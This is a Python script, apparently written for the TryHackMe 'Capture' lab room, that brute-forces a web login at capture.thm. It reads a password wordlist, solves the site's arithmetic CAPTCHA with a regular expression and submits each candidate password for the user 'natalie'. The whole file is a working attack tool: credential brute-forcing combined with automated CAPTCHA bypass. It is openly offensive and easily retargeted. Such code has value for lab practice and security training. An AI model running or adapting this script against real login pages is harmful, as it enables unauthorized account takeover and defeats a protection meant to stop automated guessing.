import requests
import re

# Target login endpoint used in the authorized TryHackMe Capture room.
URL = "http://capture.thm/login"

# A Session keeps cookies between requests. This matters because the
# application issues/uses session state while serving the login and CAPTCHA.
session = requests.Session()

# Headers make the requests resemble normal browser form submissions.
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": URL,
    "Origin": "http://capture.thm"
}

# Load the candidate passwords from the accompanying wordlist.
# Run this script from the extracted room folder so this relative path works.
with open("passwords.txt", "r") as f:
    passwords = [line.strip() for line in f if line.strip()]


def solve_captcha(html):
    """
    Find a simple arithmetic CAPTCHA in the returned HTML, extract its two
    operands and operator with a regular expression, and calculate the answer.
    Expected expression format: number operator number = ?
    """
    match = re.search(
        r'(\d+)\s*([+\-*/])\s*(\d+)\s*=\s*\?',
        html
    )

    if not match:
        print("[-] CAPTCHA expression not found")
        return None

    # Convert the captured number strings into integers.
    a = int(match.group(1))
    operator = match.group(2)
    b = int(match.group(3))

    # Perform the arithmetic operation shown by the CAPTCHA.
    if operator == "+":
        answer = a + b
    elif operator == "-":
        answer = a - b
    elif operator == "*":
        answer = a * b
    elif operator == "/" and b != 0:
        answer = a / b
    else:
        return None

    return answer


# Try each candidate password for the username discovered during the
# username-enumeration stage. The successful username is intentionally
# retained here because it is not a password or flag.
for password in passwords:
    try:
        # Start with a fresh GET to retrieve the login page and session state.
        session.get(URL, headers=headers)

        # Submit an initial invalid login to make the application return
        # the CAPTCHA challenge in its response HTML.
        data = {
            "username": "test",
            "password": "test",
        }
        response = session.post(URL, data=data, headers=headers)

        # Parse and solve the arithmetic CAPTCHA from the response.
        html = response.text.lower()
        captcha_answer = solve_captcha(html)

        if captcha_answer is None:
            print("[!] Could not solve CAPTCHA; stopping this attempt")
            break

        print(f"[*] Testing password: {password}")

        # Submit all three required form values together: username,
        # candidate password, and the newly calculated CAPTCHA answer.
        data = {
            "username": "natalie",
            "password": password,
            "captcha": str(captcha_answer)
        }

        result = session.post(URL, data=data, headers=headers)

        # The application returns a distinct message for an incorrect
        # password. A different response is treated as a possible success
        # and must be confirmed by checking the application manually.
        if "invalid password" in result.text.lower():
            print(f"[-] Invalid password: {password}")
        else:
            print(f"[?] Different response: {password}")
            break

    except requests.RequestException as e:
        # Handle connection/HTTP request errors without crashing silently.
        print(f"[!] Request error: {e}")
